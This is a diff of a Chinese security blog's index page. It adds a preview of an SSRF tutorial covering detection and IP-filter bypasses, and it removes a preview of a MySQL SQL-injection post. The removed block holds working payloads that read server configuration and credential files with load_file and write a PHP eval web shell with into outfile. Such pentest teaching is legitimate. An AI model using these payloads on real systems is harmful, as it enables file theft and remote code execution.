@@ -82,6 +82,66 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/ssrf/">SSRF</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-06-30</time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/ssrf">ssrf</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 什么是SSRF SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，它将一个可以发起网络请求的服务当作跳板来攻击其他服务，SSRF的攻击目标一般是内网。
+当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。
+0x01 SSRF的危害 可以扫描内部网络
+可以构造数据攻击内部主机
+0x02 漏洞挖掘 其实只要能对外发起网络请求就有可能存在SSRF漏洞。
+1. 从WEB功能上寻找 通过URL分享内容 文件处理、编码处理、转码等服务 在线翻译 通过URL地址加载与下载图片 图片、文章的收藏 设置邮件接收服务器 2. 从URL关键字寻找 share、wap、url、link、src、source、target、u、3g、 display、sourceURl、imageURL、domain...  0x03 漏洞验证 http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png 1. 右键在新窗口打开图片，图片地址为http://www.baidu.com/img/bd_logo1.png， 说明不存在SSRF漏洞。 2. firebug看网络连接信息，若没有http://www.baidu.com/img/bd_logo1.png 这个图片请求，则证明图片是aa.com服务端发起的请求，则可能存在SSRF漏洞。  0x04 绕过过滤 有时漏洞利用时会遇到IP限制，可用如下方法绕过：
+* 使用@：http://A.com@10.10.10.10 = 10.10.10.10 * IP地址转换成十进制、八进制：127.0.0.1 = 2130706433 * 使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx * 端口绕过：ip后面加一个端口 * xip.io：10.0.0.1.xip.io = 10.0.0.1 www.10.0.0.1.xip.io = 10.0.0.1 mysite.10.0.0.1.xip.io = 10.0.0.1 foo.bar.10.0.0.1.xip.io = 10.0.0.1 * 通过js跳转  0x05 通用的SSRF实例  weblogin配置不当，天生ssrf漏洞 discuz x2.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/ssrf/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/python-encode-setting/">Python的编码问题</a></h2>
 
         
@@ -590,68 +650,6 @@ CSRF就是：攻击者通过一些技术手段欺骗用户的浏览器去访问�
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/injection-of-mysql-function/">SQL注入之MySQL函数利用</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 0px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-06-20</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 load_file()  条件:  1. 要有file_priv权限 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
- 读/etc/init.d下的东西，这里有配置文件路径
-?id=1' union select 1,2,load_file('/etc/init.d/httpd')  得到web安装路径
-?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')  读取密码文件
-?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php')    0x01 into outfile  条件：  1. 要有file_priv权限 2. 知道网站绝对路径 3. 要能用union 4. 对web目录有写权限 5. 没有过滤单引号   一般方法
-当知道路径时，可以直接用?id=1 union select &ldquo;&lt;?php @eval($_POST[&lsquo;c&rsquo;]);?&gt;&rdquo; into outfile(&ldquo;C:/phpStudy/WWW/a.php&rdquo;)
- 其他方法
- 登陆phpMyAdmin
-use test; 选择数据库为test create table aaa(bbb varchar(64)); 在数据库中创建一个表aaa insert into aaa values(&quot;&lt;?
-    </p>
-
-    
-    <footer>
-        <a href="/posts/injection-of-mysql-function/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
 
             
 
@@ -694,7 +692,7 @@ use test; 选择数据库为test create table aaa(bbb varchar(64)); 在数据库
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/other" title="other">other(13)</a></li>
         
-            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/pentest" title="pentest">pentest(66)</a></li>
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/pentest" title="pentest">pentest(67)</a></li>
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/php" title="php">php(12)</a></li>
         
@@ -918,7 +916,7 @@ use test; 选择数据库为test create table aaa(bbb varchar(64)); 在数据库
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" title="代码执行">代码执行</a>
-                <sup>3</sup>
+                <sup>4</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -938,7 +936,7 @@ use test; 选择数据库为test create table aaa(bbb varchar(64)); 在数据库
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" title="命令执行">命令执行</a>
-                <sup>1</sup>
+                <sup>2</sup>
             </p>
         
             <p style="display:inline-block;">
